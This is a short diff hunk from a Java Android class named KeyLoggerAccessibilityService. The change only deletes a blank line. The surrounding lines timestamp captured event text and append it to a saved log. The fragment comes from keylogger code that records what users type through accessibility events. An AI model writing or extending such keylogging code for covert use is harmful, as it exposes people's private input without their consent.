@@ -95,7 +95,6 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
                 // Create timestamp
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
                 String currentDatetime = sdf.format(new Date());
-
                 newLog = savedLog + "\n[" + eventSource + " ::: "+ currentDatetime + "]\n" + eventLog;
             }
 
